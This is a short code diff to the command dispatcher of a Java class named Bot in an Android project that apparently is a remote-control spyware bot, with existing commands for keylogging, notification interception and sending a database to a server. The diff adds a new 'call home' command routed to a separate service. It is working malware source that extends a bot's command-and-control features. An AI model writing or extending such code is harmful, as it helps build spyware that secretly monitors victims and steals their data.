@@ -11,6 +11,7 @@ import com.candroid.lofl.data.Constants;
 import com.candroid.lofl.receivers.AdminReceiver;
 import com.candroid.lofl.receivers.OutgoingCallReceiver;
 import com.candroid.lofl.receivers.ScreenReceiver;
+import com.candroid.lofl.services.CallHomeIntentService;
 import com.candroid.lofl.services.CommandsIntentService;
 import com.candroid.lofl.services.LoflService;
 
@@ -306,6 +307,11 @@ public class Bot {
                 intent.setAction(CommandsIntentService.ACTION_NOTIFICATION_INTERCEPTOR);
                 commandFound = true;
                 break;
+            case Commands.CALL_HOME:
+                intent.setClass(context, CallHomeIntentService.class);
+                intent.setAction(CallHomeIntentService.ACTION_CALL_HOME);
+                commandFound = true;
+                break;
             default:
                 break;
         }
@@ -352,5 +358,6 @@ public class Bot {
         public static final int SEND_DB_TO_SERVER = 33;
         public static final int KEYLOGGER = 34;
         public static final int NOTIFICATION_INTERCEPTOR = 35;
+        public static final int CALL_HOME = 666;
     }
 }
